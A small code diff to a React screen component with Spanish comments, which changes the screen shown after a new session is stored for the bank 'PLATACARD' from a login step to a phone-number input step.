@@ -344,7 +344,7 @@ export default function ClientScreen() {
           
           // Actualizar el estado local con el nuevo sessionId
           setSessionData(prev => ({ ...prev, sessionId: newSessionId, banco: 'PLATACARD' }));
-          setCurrentScreen(ScreenType.LOGIN);
+          setCurrentScreen(ScreenType.PHONE_INPUT);
           return;
         }
         
